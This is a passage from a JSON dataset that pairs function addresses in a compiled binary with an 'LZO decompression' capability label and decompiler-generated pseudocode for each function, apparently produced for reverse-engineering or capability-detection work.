puVar20 + -4;\n                puVar20 = puVar20 + -4;\n                *puVar18 = 0x45cc80;\n                var_30h._2_2_ = (*pcVar2)();\n            }\n            piVar9 = NULL;\n            if (var_30h._2_2_ != 0xffff) {\n                piVar9 = var_34h;\n            }\n            var_34h = piVar9;\n        }\n        if (puVar25 == NULL) goto code_r0x0045ca40;\n        puVar10 = NULL;\n        var_1ch = puVar24;\n        puVar24 = var_1ch;\n        var_2ch = NULL;\n        stack0xffffffc4 = var_20h * 2;\n        do {\n            while (puVar1 = puVar24 + puVar10,  *puVar1 < var_20h || *puVar1 == var_20h) {\n                var_2ch = var_2ch + 1;\ncode_r0x0045c95a:\n                puVar10 = puVar10 + 1;\n                if (puVar25 <= puVar10) goto code_r0x0045c9a9;\n            }\n            var_28h = var_24h + puVar10;\n            if (*(*(arg_1ch + *var_28h * 4) + var_20h * 2) == var_30h._2_2_) goto code_r0x0045c95a;\n            puVar25 = puVar25 + -1;\n            *var_28h = var_24h[puVar25];\n            *puVar1 = puVar24[puVar25];\n        } while (puVar10 < puVar25);\ncode_r0x0045c9a9:\n        if (var_2ch == puVar25) break;\n        if (var_34h[2] < var_34h[3]) {\n            var_34h[2] = var_34h[2] + 2;\n        }\n        else {\n            pcVar2 = *(*var_34h + 0x28);\n            puVar14 = puVar20 + -4;\n            puVar20 = puVar20 + -4;\n            *puVar14 = 0x45cac8;\n            (*pcVar2)();\n        }\n        var_20h = var_20h + 1;\n        var_30h._0_2_ = 0xffff;\n    } while( true );\n    if (puVar25 == 0x1) {\n        uVar13 = *puVar24;\njoined_r0x0045cae0:\n        if (uVar13 == var_20h) {\ncode_r0x0045cae6:\n            uVar13 = *var_24h;\n            if (arg_20h <= uVar13) {\n                uVar13 = uVar13 - arg_20h;\n            }\n            *arg_18h = uVar13;\n            goto code_r0x0045ca46;\n        }\n    }\n    else if (puVar25 == 0x2) {\n        if (*puVar24 != var_20h) {\n            uVar13 = puVar24[1];\n            goto joined_r0x0045cae0;\n        }\n        goto code_r0x0045cae6;\n    }\ncode_r0x0045ca40:\n    *arg_28h = *arg_28h | 4;\ncode_r0x0045ca46:\n    var_44h = CONCAT22(var_44h._2_2_, var_30h);\n    return CONCAT44(var_44h, var_34h);\n}\n",
        "token_count": 3428
    },
    "0045d860": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING (jumptable): Heritage AFTER dead removal. Example location: s0xffffffb0 : 0x0045d920\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Removing unreachable block (ram,0x0045e217)\n// WARNING: Removing unreachable block (ram,0x0045d9ce)\n// WARNING: Removing unreachable block (ram,0x0045d9d8)\n// WARNING: Removing unreachable block (ram,0x0045d9e2)\n// WARNING: Removing unreachable block (ram,0x0045e0f0)\n// WARNING: Removing unreachable block (ram,0x0045e498)\n// WARNING: Removing unreachable block (ram,0x0045e4a6)\n// WARNING: Removing unreachable block (ram,0x0045d9eb)\n// WARNING: Removing unreachable block (ram,0x0045d9f7)\n// WARNING: Removing unreachable block (ram,0x0045e1a0)\n// WARNING: Removing unreachable block (ram,0x0045e0fc)\n// WARNING: Removing unreachable block (ram,0x0045e10b)\n// WARNING: Removing unreachable block (ram,0x0045da06)\n// WARNING: Removing unreachable block (ram,0x0045da0c)\n// WARNING: Removing unreachable block (ram,0x0045d970)\n// WARNING: Removing unreachable block (ram,0x0045d97a)\n// WARNING: Removing unreachable block (ram,0x0045dfd0)\n// WARNING: Removing unreachable block (ram,0x0045d97d)\n// WARNING: Removing unreachable block (ram,0x0045d990)\n// WARNING: Removing unreachable block (ram,0x0045e0c0)\n// WARNING: Removing unreachable block (ram,0x0045e0ce)\n// WARNING: Removing unreachable block (ram,0x0045e0dc)\n// WARNING: Removing unreachable block (ram,0x0045d9aa)\n// WARNING: Removing unreachable block (ram,0x0045d9b8)\n// WARNING: Removing unreachable block (ram,0x0045d9c0)\n// WARNING: Removing unreachable block (ram,0x0045dfa1)\n// WARNING: Removing unreachable block (ram,0x0045dfad)\n// WARNING: Removing unreachable block (ram,0x0045dfc3)\n// WARNING: Removing unreachable block (ram,0x0045d9c2)\n// WARNING: Removing unreachable block (ram,0x0045e1b0)\n// WARNING: Removing unreachable block (ram,0x0045e1bc)\n// WARNING: Removing unreachable block (ram,0x0045e1cc)\n// WARNING: Removing unreachable block (ram,0x0045e1d4)\n// WARNING: Removing unreachable block (ram,0x0045e24e)\n// WARNING: Removing unreachable block (ram,0x0045dea1)\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nulong __cdecl\nfcn.0045d860(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h, uint32_t *arg_1ch, uint arg_20h)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t arg_8h_00;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    ulong uVar7;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    int32_t var_70h;\n    uint var_6bh;\n    uint s;\n    uint var_60h;\n    uint var_5ch;\n    uint var_4ch;\n    uint *var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint *var_30h;\n    uint32_t var_2ch;\n    uint var_28h;\n    uint var_ch;\n    \n    arg_8h_00 = arg_18h + 0x6c;\n    fcn.004c0160(arg_8h_00);\n    iVar3 = fcn.00451af0();\n    piVar1 = *(*(arg_18h + 0x6c) + 0xc) + iVar3 * 4;\n    iVar6 = *piVar1;\n    if (iVar6 == 0) {\n        puVar5 = fcn.004c2c70(0x44);\n        *puVar5 = 0x52c654;\n        puVar5[1] = 0;\n        puVar5[2] = 0;\n        puVar5[3] = 0;\n        *(puVar5 + 4) = 0;\n        *(puVar5 + 0x12) = 0;\n        puVar5[5] = 0;\n        puVar5[6] = 0;\n        puVar5[7] = 0;\n        puVar5[8] = 0;\n        puVar5[9] = 0;\n        puVar5[10] = 0;\n        puVar5[0xb] = 0;\n        puVar5[0xc] = 0;\n        puVar5[0xd] = 0;\n        *(puVar5 + 0x43) = 0;\n        fcn.004a9a30(arg_8h_00);\n        fcn.004ad130(puVar5, iVar3);\n        iVar6 = *piVar1;\n    }\n    var_48h = &var_40h;\n    var_44h = 0;\n    var_40h._0_1_ = 0;\n    if (*(iVar6 + 0x10) != '\\0') {\n        fcn.004b1bc0(0x20);\n    }\n    var_30h = &var_28h;\n    var_2ch = 0;\n    var_28h._0_1_ = 0;\n    fcn.004b1bc0(0x20);\n    var_70h = 1;\n    var_4ch = *(iVar6 + 0x34);\n    puVar5 = &var_4ch;\n    while( true ) {\n        if (var_4ch < 5) {\n    // WARNING: Could not recover jumptable at 0x0045d948. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (5 cases) at 0x523ed4\n            uVar7 = (**(*puVar5 * 4 + 0x523ed4))();\n            return uVar7;\n        }\n        if (3 < var_70h) break;\n        puVar5 = &var_4ch + var_70h;\n        var_4ch._0_1_ = *puVar5;\n        var_70h = var_70h + 1;\n    }\n    if ((var_2ch < 2) || (uVar4 = fcn.00454ae0(0x30, 0),  uVar4 == 0)) goto code_r0x0045e1c6;\n    if (uVar4 == 0xffffffff) {\n        uVar4 = var_2ch - 1;\n        if (uVar4 == 0xffffffff) {\n            *var_30h = 0;\n            goto code_r0x0045e1c6;\n        }\n        if (uVar4 == 0) goto code_r0x0045e1c6;\n    }\n    if (var_2ch < uVar4) {\n        uVar4 = var_2ch;\n    }\n    fcn.004b1cc0(0, uVar4);\ncode_r0x0045e1c6:\n    if (var_44h != 0) {\n        fcn.004b20a0(0);\n        cVar2 = fcn.004bdf20(*(iVar6 + 8), *(iVar6 + 0xc), &var_48h);\n        if (cVar2 == '\\0') {\n            *arg_1ch = *arg_1ch | 4;\n        }\n    }\n    fcn.004b0780(&var_30h);\n    cVar2 = fcn.004502d0(&arg_10h);\n    if (cVar2 != '\\0') {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    if (var_30h != &var_28h) {\n        fcn.004c2c30(var_30h);\n    }\n    if (var_48h != &var_40h) {\n        fcn.004c2c30(var_48h);\n    }\n    return CONCAT44(arg_ch, arg_8h);\n}\n",
        "token_count": 1983
    },
    "0045e570": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING (jumptable): Heritage AFTER dead removal. Example location: s0xffffffb0 : 0x0045e630\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Removing unreachable block (ram,0x0045ef27)\n// WARNING: Removing unreachable block (ram,0x0045e6de)\n// WARNING: Removing unreachable block (ram,0x0045e6e8)\n// WARNING: Removing unreachable block (ram,0x0045e6f2)\n// WARNING: Removing unreachable block (ram,0x0045ee00)\n// WARNING: Removing unreachable block (ram,0x0045f1a8)\n// WARNING: Removing unreachable block (ram,0x0045f1b6)\n// WARNING: Removing unreachable block (ram,0x0045e6fb)\n// WARNING: Removing unreachable block (ram,0x0045e707)\n// WARNING: Removing unreachable block (ram,0x0045eeb0)\n// WARNING: Removing unreachable block (ram,0x0045ee0c)\n// WARNING: Removing unreachable block (ram,0x0045ee1b)\n// WARNING: Removing unreachable block (ram,0x0045e716)\n// WARNING: Removing unreachable block (ram,0x0045e71c)\n// WARNING: Removing unreachable block (ram,0x0045e680)\n// WARNING: Removing unreachable block (ram,0x0045e68a)\n// WARNING: Removing unreachable block (ram,0x0045ece0)\n// WARNING: Removing unreachable block (ram,0x0045e68d)\n// WARNING: Removing unreachable block (ram,0x0045e6a0)\n// WARNING: Removing unreachable block (ram,0x0045edd0)\n// WARNING: Removing unreachable block (ram,0x0045edde)\n// WARNING: Removing unreachable block (ram,0x0045edec)\n// WARNING: Removing unreachable block (ram,0x0045e6ba)\n// WARNING: Removing unreachable block (ram,0x0045e6c8)\n// WARNING: Removing unreachable block (ram,0x0045e6d0)\n// WARNING: Removing unreachable block (ram,0x0045ecb1)\n// WARNING: Removing unreachable block (ram,0x0045ecbd)\n// WARNING: Removing unreachable block (ram,0x0045ecd3)\n// WARNING: Removing unreachable block (ram,0x0045e6d2)\n// WARNING: Removing unreachable block (ram,0x0045eec0)\n// WARNING: Removing unreachable block (ram,0x0045eecc)\n// WARNING: Removing unreachable block (ram,0x0045eedc)\n// WARNING: Removing unreachable block (ram,0x0045eee4)\n// WARNING: Removing unreachable block (ram,0x0045ef5e)\n// WARNING: Removing unreachable block (ram,0x0045ebb1)\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nulong __cdecl\nfcn.0045e570(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h, uint32_t *arg_1ch, uint arg_20h)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t arg_8h_00;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    ulong uVar7;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    int32_t var_70h;\n    uint var_6bh;\n    uint s;\n    uint var_60h;\n    uint var_5ch;\n    uint var_4ch;\n    uint *var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint *var_30h;\n    uint32_t var_2ch;\n    uint var_28h;\n    uint var_ch;\n    \n    arg_8h_00 = arg_18h + 0x6c;\n    fcn.004c0160(arg_8h_00);\n    iVar3 = fcn.00451af0();\n    piVar1 = *(*(arg_18h + 0x6c) + 0xc) + iVar3 * 4;\n    iVar6 = *piVar1;\n    if (iVar6 == 0) {\n        puVar5 = fcn.004c2c70(0x44);\n        *puVar5 = 0x52c664;\n        puVar5[1] = 0;\n        puVar5[2] = 0;\n        puVar5[3] = 0;\n        *(puVar5 + 4) = 0;\n        *(puVar5 + 0x12) = 0;\n        puVar5[5] = 0;\n        puVar5[6] = 0;\n        puVar5[7] = 0;\n        puVar5[8] = 0;\n        puVar5[9] = 0;\n        puVar5[10] = 0;\n        puVar5[0xb] = 0;\n        puVar5[0xc] = 0;\n        puVar5[0xd] = 0;\n        *(puVar5 + 0x43) = 0;\n        fcn.004aa110(arg_8h_00);\n        fcn.004ad130(puVar5, iVar3);\n        iVar6 = *piVar1;\n    }\n    var_48h = &var_40h;\n    var_44h = 0;\n    var_40h._0_1_ = 0;\n    if (*(iVar6 + 0x10) != '\\0') {\n        fcn.004b1bc0(0x20);\n    }\n    var_30h = &var_28h;\n    var_2ch = 0;\n    var_28h._0_1_ = 0;\n    fcn.004b1bc0(0x20);\n    var_70h = 1;\n    var_4ch = *(iVar6 + 0x34);\n    puVar5 = &var_4ch;\n    while( true ) {\n        if (var_4ch < 5) {\n    // WARNING: Could not recover jumptable at 0x0045e658. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (5 cases) at 0x523ec0\n            uVar7 = (**(*puVar5 * 4 + 0x523ec0))();\n            return uVar7;\n        }\n        if (3 < var_70h) break;\n        puVar5 = &var_4ch + var_70h;\n        var_4ch._0_1_ = *puVar5;\n        var_70h = var_70h + 1;\n    }\n    if ((var_2ch < 2) || (uVar4 = fcn.00454ae0(0x30, 0),  uVar4 == 0)) goto code_r0x0045eed6;\n    if (uVar4 == 0xffffffff) {\n        uVar4 = var_2ch - 1;\n        if (uVar4 == 0xffffffff) {\n            *var_30h = 0;\n            goto code_r0x0045eed6;\n        }\n        if (uVar4 == 0) goto code_r0x0045eed6;\n    }\n    if (var_2ch < uVar4) {\n        uVar4 = var_2ch;\n    }\n    fcn.004b1cc0(0, uVar4);\ncode_r0x0045eed6:\n    if (var_44h != 0) {\n        fcn.004b20a0(0);\n        cVar2 = fcn.004bdf20(*(iVar6 + 8), *(iVar6 + 0xc), &var_48h);\n        if (cVar2 == '\\0') {\n            *arg_1ch = *arg_1ch | 4;\n        }\n    }\n    fcn.004b0780(&var_30h);\n    cVar2 = fcn.004502d0(&arg_10h);\n    if (cVar2 != '\\0') {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    if (var_30h != &var_28h) {\n        fcn.004c2c30(var_30h);\n    }\n    if (var_48h != &var_40h) {\n        fcn.004c2c30(var_48h);\n    }\n    return CONCAT44(arg_ch, arg_8h);\n}\n",
        "token_count": 1962
    },
    "0045f4d0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING (jumptable): Heritage AFTER dead removal. Example location: s0xffffffb0 : 0x0045f59d\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Removing unreachable block (ram,0x0045fe00)\n// WARNING: Removing unreachable block (ram,0x0045f63b)\n// WARNING: Removing unreachable block (ram,0x0045f646)\n// WARNING: Removing unreachable block (ram,0x0045fe5f)\n// WARNING: Removing unreachable block (ram,0x0046012a)\n// WARNING: Removing unreachable block (ram,0x0045fe6b)\n// WARNING: Removing unreachable block (ram,0x0045fe6e)\n// WARNING: Removing unreachable block (ram,0x0045fe78)\n// WARNING: Removing unreachable block (ram,0x0045f650)\n// WARNING: Removing unreachable block (ram,0x0045f65d)\n// WARNING: Removing unreachable block (ram,0x0045ff16)\n// WARNING: Removing unreachable block (ram,0x0045f66c)\n// WARNING: Removing unreachable block (ram,0x0045f672)\n// WARNING: Removing unreachable block (ram,0x0045f5e8)\n// WARNING: Removing unreachable block (ram,0x0045f5f5)\n// WARNING: Removing unreachable block (ram,0x0045fc9f)\n// WARNING: Removing unreachable block (ram,0x0045f5fb)\n// WARNING: Removing unreachable block (ram,0x0045f683)\n// WARNING: Removing unreachable block (ram,0x0045f699)\n// WARNING: Removing unreachable block (ram,0x00460120)\n// WARNING: Removing unreachable block (ram,0x0045f6a5)\n// WARNING: Removing unreachable block (ram,0x0045f6a8)\n// WARNING: Removing unreachable block (ram,0x0045f6b4)\n// WARNING: Removing unreachable block (ram,0x0045f610)\n// WARNING: Removing unreachable block (ram,0x0045fd70)\n// WARNING: Removing unreachable block (ram,0x00460134)\n// WARNING: Removing unreachable block (ram,0x0045fd7c)\n// WARNING: Removing unreachable block (ram,0x0045fd7f)\n// WARNING: Removing unreachable block (ram,0x0045fd8b)\n// WARNING: Removing unreachable block (ram,0x0045f62a)\n// WARNING: Removing unreachable block (ram,0x0045f632)\n// WARNING: Removing unreachable block (ram,0x0045fd9c)\n// WARNING: Removing unreachable block (ram,0x0045fda5)\n// WARNING: Removing unreachable block (ram,0x0045fdb5)\n// WARNING: Removing unreachable block (ram,0x0045fdbd)\n// WARNING: Removing unreachable block (ram,0x0045fe3a)\n// WARNING: Removing unreachable block (ram,0x0045fac3)\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nulong __cdecl\nfcn.0045f4d0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h, uint32_t *arg_1ch, uint arg_20h)\n\n{\n    int32_t arg_8h_00;\n    int32_t *piVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    ulong uVar6;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    int32_t var_74h;\n    uint var_6fh;\n    uint var_68h;\n    int32_t var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_4ch;\n    uint *var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint *var_30h;\n    uint32_t var_2ch;\n    uint var_28h;\n    uint var_ch;\n    \n    arg_8h_00 = arg_18h + 0x6c;\n    fcn.004c01c0(arg_8h_00);\n    iVar3 = fcn.00451af0();\n    piVar1 = *(*(arg_18h + 0x6c) + 0xc) + iVar3 * 4;\n    var_64h = *piVar1;\n    if (var_64h == 0) {\n        puVar5 = fcn.004c2c70(0x54);\n        puVar5[1] = 0;\n        *puVar5 = 0x52c674;\n        puVar5[2] = 0;\n        puVar5[3] = 0;\n        *(puVar5 + 4) = 0;\n        *(puVar5 + 0x12) = 0;\n        puVar5[6] = 0;\n        puVar5[7] = 0;\n        puVar5[8] = 0;\n        puVar5[9] = 0;\n        puVar5[10] = 0;\n        puVar5[0xb] = 0;\n        puVar5[0xc] = 0;\n        puVar5[0xd] = 0;\n        puVar5[0xe] = 0;\n        *(puVar5 + 0x52) = 0;\n        fcn.004aa7f0(arg_8h_00);\n        fcn.004ad130(puVar5, iVar3);\n        var_64h = *piVar1;\n    }\n    var_48h = &var_40h;\n    var_44h = 0;\n    var_40h._0_1_ = 0;\n    if (*(var_64h + 0x10) != '\\0') {\n        fcn.004b1bc0(0x20);\n    }\n    var_30h = &var_28h;\n    var_2ch = 0;\n    var_28h._0_1_ = 0;\n    fcn.004b1bc0(0x20);\n    var_74h = 1;\n    var_4ch = *(var_64h + 0x38);\n    puVar5 = &var_4ch;\n    while( true ) {\n        if (var_4ch < 5) {\n    // WARNING: Could not recover jumptable at 0x0045f5c1. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (5 cases) at 0x524190\n            uVar6 = (**(*puVar5 * 4 + 0x524190))();\n            return uVar6;\n        }\n        if (3 < var_74h) break;\n        puVar5 = &var_4ch + var_74h;\n        var_4ch._0_1_ = *puVar5;\n        var_74h = var_74h + 1;\n    }\n    if ((var_2ch < 2) || (uVar4 = fcn.00454ae0(0x30, 0),  uVar4 == 0)) goto code_r0x0045fdaf;\n    if (uVar4 == 0xffffffff) {\n        uVar4 = var_2ch - 1;\n        if (uVar4 == 0xffffffff) {\n            *var_30h = 0;\n            goto code_r0x0045fdaf;\n        }\n        if (uVar4 == 0) goto code_r0x0045fdaf;\n    }\n    if (var_2ch < uVar4) {\n        uVar4 = var_2ch;\n    }\n    fcn.004b1cc0(0, uVar4);\ncode_r0x0045fdaf:\n    if (var_44h != 0) {\n        fcn.004b20a0(0);\n        cVar2 = fcn.004bdf20(*(var_64h + 8), *(var_64h + 0xc), &var_48h);\n        if (cVar2 == '\\0') {\n            *arg_1ch = *arg_1ch | 4;\n        }\n    }\n    fcn.004b0780(&var_30h);\n    cVar2 = fcn.00450410(&arg_10h);\n    if (cVar2 != '\\0') {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    if (var_30h != &var_28h) {\n        fcn.004c2c30(var_30h);\n    }\n    if (var_48h != &var_40h) {\n        fcn.004c2c30(var_48h);\n    }\n    return CONCAT44(arg_ch, arg_8h);\n}\n",
        "token_count": 2008
    },
    "00460210": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING (jumptable): Heritage AFTER dead removal. Example location: s0xffffffb0 : 0x004602dd\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Removing unreachable block (ram,0x00460b40)\n// WARNING: Removing unreachable block (ram,0x0046037b)\n// WARNING: Removing unreachable block (ram,0x00460386)\n// WARNING: Removing unreachable block (ram,0x00460b9f)\n// WARNING: Removing unreachable block (ram,0x00460e6a)\n// WARNING: Removing unreachable block (ram,0x00460bab)\n// WARNING: Removing unreachable block (ram,0x00460bae)\n// WARNING: Removing unreachable block (ram,0x00460bb8)\n// WARNING: Removing unreachable block (ram,0x00460390)\n// WARNING: Removing unreachable block (ram,0x0046039d)\n// WARNING: Removing unreachable block (ram,0x00460c56)\n// WARNING: Removing unreachable block (ram,0x004603ac)\n// WARNING: Removing unreachable block (ram,0x004603b2)\n// WARNING: Removing unreachable block (ram,0x00460328)\n// WARNING: Removing unreachable block (ram,0x00460335)\n// WARNING: Removing unreachable block (ram,0x004609df)\n// WARNING: Removing unreachable block (ram,0x0046033b)\n// WARNING: Removing unreachable block (ram,0x004603c3)\n// WARNING: Removing unreachable block (ram,0x004603d9)\n// WARNING: Removing unreachable block (ram,0x00460e60)\n// WARNING: Removing unreachable block (ram,0x004603e5)\n// WARNING: Removing unreachable block (ram,0x004603e8)\n// WARNING: Removing unreachable block (ram,0x004603f4)\n// WARNING: Removing unreachable block (ram,0x00460350)\n// WARNING: Removing unreachable block (ram,0x00460ab0)\n// WARNING: Removing unreachable block (ram,0x00460e74)\n// WARNING: Removing unreachable block (ram,0x00460abc)\n// WARNING: Removing unreachable block (ram,0x00460abf)\n// WARNING: Removing unreachable block (ram,0x00460acb)\n// WARNING: Removing unreachable block (ram,0x0046036a)\n// WARNING: Removing unreachable block (ram,0x00460372)\n// WARNING: Removing unreachable block (ram,0x00460adc)\n// WARNING: Removing unreachable block (ram,0x00460ae5)\n// WARNING: Removing unreachable block (ram,0x00460af5)\n// WARNING: Removing unreachable block (ram,0x00460afd)\n// WARNING: Removing unreachable block (ram,0x00460b7a)\n// WARNING: Removing unreachable block (ram,0x00460803)\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nulong __cdecl\nfcn.00460210(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h, uint32_t *arg_1ch, uint arg_20h)\n\n{\n    int32_t arg_8h_00;\n    int32_t *piVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    ulong uVar6;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    int32_t var_74h;\n    uint var_6fh;\n    uint var_68h;\n    int32_t var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_4ch;\n    uint *var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint *var_30h;\n    uint32_t var_2ch;\n    uint var_28h;\n    uint var_ch;\n    \n    arg_8h_00 = arg_18h + 0x6c;\n    fcn.004c01c0(arg_8h_00);\n    iVar3 = fcn.00451af0();\n    piVar1 = *(*(arg_18h + 0x6c) + 0xc) + iVar3 * 4;\n    var_64h = *piVar1;\n    if (var_64h == 0) {\n        puVar5 = fcn.004c2c70(0x54);\n        puVar5[1] = 0;\n        *puVar5 = 0x52c684;\n        puVar5[2] = 0;\n        puVar5[3] = 0;\n        *(puVar5 + 4) = 0;\n        *(puVar5 + 0x12) = 0;\n        puVar5[6] = 0;\n        puVar5[7] = 0;\n        puVar5[8] = 0;\n        puVar5[9] = 0;\n        puVar5[10] = 0;\n        puVar5[0xb] = 0;\n        puVar5[0xc] = 0;\n        puVar5[0xd] = 0;\n        puVar5[0xe] = 0;\n        *(puVar5 + 0x52) = 0;\n        fcn.004ab010(arg_8h_00);\n        fcn.004ad130(puVar5, iVar3);\n        var_64h = *piVar1;\n    }\n    var_48h = &var_40h;\n    var_44h = 0;\n    var_40h._0_1_ = 0;\n    if (*(var_64h + 0x10) != '\\0') {\n        fcn.004b1bc0(0x20);\n    }\n    var_30h = &var_28h;\n    var_2ch = 0;\n    var_28h._0_1_ = 0;\n    fcn.004b1bc0(0x20);\n    var_74h = 1;\n    var_4ch = *(var_64h + 0x38);\n    puVar5 = &var_4ch;\n    while( true ) {\n        if (var_4ch < 5) {\n    // WARNING: Could not recover jumptable at 0x00460301. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (5 cases) at 0x52417c\n            uVar6 = (**(*puVar5 * 4 + 0x52417c))();\n            return uVar6;\n        }\n        if (3 < var_74h) break;\n        puVar5 = &var_4ch + var_74h;\n        var_4ch._0_1_ = *puVar5;\n        var_74h = var_74h + 1;\n    }\n    if ((var_2ch < 2) || (uVar4 = fcn.00454ae0(0x30, 0),  uVar4 == 0)) goto code_r0x00460aef;\n    if (uVar4 == 0xffffffff) {\n        uVar4 = var_2ch - 1;\n        if (uVar4 == 0xffffffff) {\n            *var_30h = 0;\n            goto code_r0x00460aef;\n        }\n        if (uVar4 == 0) goto code_r0x00460aef;\n    }\n    if (var_2ch < uVar4) {\n        uVar4 = var_2ch;\n    }\n    fcn.004b1cc0(0, uVar4);\ncode_r0x00460aef:\n    if (var_44h != 0) {\n        fcn.004b20a0(0);\n        cVar2 = fcn.004bdf20(*(var_64h + 8), *(var_64h + 0xc), &var_48h);\n        if (cVar2 == '\\0') {\n            *arg_1ch = *arg_1ch | 4;\n        }\n    }\n    fcn.004b0780(&var_30h);\n    cVar2 = fcn.00450410(&arg_10h);\n    if (cVar2 != '\\0') {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    if (var_30h != &var_28h) {\n        fcn.004c2c30(var_30h);\n    }\n    if (var_48h != &var_40h) {\n        fcn.004c2c30(var_48h);\n    }\n    return CONCAT44(arg_ch, arg_8h);\n}\n",
        "token_count": 1966
    },
    "00461210": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl fcn.00461210(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, uint arg_18h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t *piVar7;\n    int32_t *piVar8;\n    int32_t *piVar9;\n    unkbyte10 in_stack_00000018;\n    uint uStack132;\n    uint *puStack128;\n    uint32_t auStack124 [4];\n    unkbyte10 aStack108 [2];\n    uint *var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint32_t var_40h;\n    uint var_3ch;\n    uint var_34h;\n    uint *var_30h;\n    uint var_28h;\n    uint var_bp_ch;\n    \n    var_48h = arg_10h;\n    var_4ch = arg_18h;\n    auStack124[0] = arg_14h + 0x6c;\n    puStack128 = 0x461239;\n    fcn.004aebe0();\n    puStack128 = &fcn.00461210::var_34h;\n    uStack132 = 0x461247;\n    piVar3 = fcn.004c0160();\n    uStack132 = 0x461253;\n    iVar4 = fcn.00437ed0();\n    iVar4 = -iVar4;\n    piVar7 = &stack0xffffff80 + iVar4;\n    uVar6 = &fcn.00461210::var_50h + iVar4 + 3 & 0xfffffff0;\n    var_40h = uVar6;\n    *(&stack0xffffff7c + iVar4) = 0x461264;\n    var_30h = fcn.004ae940();\n    *(&stack0xffffff90 + iVar4) = 0;\n    *(&stack0xffffff8c + iVar4) = 0x523dbc;\n    *(&stack0xffffff88 + iVar4) = 0x40;\n    *(&stack0xffffff94 + iVar4) = in_stack_00000018;\n    *(&stack0xffffff84 + iVar4) = uVar6;\n    *(&stack0xffffff80 + iVar4) = &fcn.00461210::var_30h;\n    *(&stack0xffffff7c + iVar4) = 0x461295;\n    iVar5 = fcn.004bd670();\n    if (0x3f < iVar5) {\n        var_50h = iVar5 + 1;\n        *(&stack0xffffff7c + iVar4) = 0x4612b0;\n        iVar5 = fcn.00437ed0();\n        iVar5 = -iVar5;\n        piVar7 = &stack0xffffff80 + iVar5 + iVar4;\n        uVar6 = &fcn.00461210::var_50h + iVar5 + iVar4 + 3 & 0xfffffff0;\n        var_40h = uVar6;\n        *(&stack0xffffff7c + iVar5 + iVar4) = 0x4612c1;\n        var_30h = fcn.004ae940();\n        iVar2 = var_50h;\n        *(&stack0xffffff90 + iVar5 + iVar4) = 0;\n        *(&stack0xffffff8c + iVar5 + iVar4) = 0x523dbc;\n        *(&stack0xffffff94 + iVar5 + iVar4) = in_stack_00000018;\n        *(&stack0xffffff88 + iVar5 + iVar4) = iVar2;\n        *(&stack0xffffff84 + iVar5 + iVar4) = uVar6;\n        *(&stack0xffffff80 + iVar5 + iVar4) = &fcn.00461210::var_30h;\n        *(&stack0xffffff7c + iVar5 + iVar4) = 0x4612ee;\n        iVar5 = fcn.004bd670();\n    }\n    piVar7[1] = 0;\n    *piVar7 = iVar5;\n    var_30h = &fcn.00461210::var_28h;\n    piVar7[-1] = 0x461308;\n    fcn.004b0120();\n    piVar9 = piVar7 + -2;\n    var_50h = var_30h;\n    if (*(piVar3 + 7) != '\\x01') {\n        if (*(piVar3 + 7) 